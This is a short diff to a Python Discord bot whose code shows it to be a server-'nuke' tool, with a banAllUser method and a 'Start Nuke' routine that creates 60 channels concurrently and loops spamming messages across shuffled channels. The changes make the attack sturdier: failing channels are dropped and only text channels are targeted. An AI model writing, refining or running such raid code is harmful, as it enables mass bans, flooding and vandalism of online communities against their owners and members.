@@ -41,6 +41,7 @@ class DiscordBot(commands.Bot):
         except:
             logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
             logs[self.logId] += "[-]Failed"
+            self.channels.pop(channel)
         logs[self.logId] += f" | {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
         await asyncio.sleep(latencyMs)
     async def banAllUser(self, guild:discord.Guild):
@@ -58,7 +59,7 @@ class DiscordBot(commands.Bot):
         logs[self.logId] += "---- Start Nuke ----\n"
         try:
             await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
-            self.channels = list(guild.channels)
+            self.channels = list(guild.text_channels)
             random.shuffle(self.channels)
             for _ in range(numberOfExecutions):
                 if self.logId in stops:
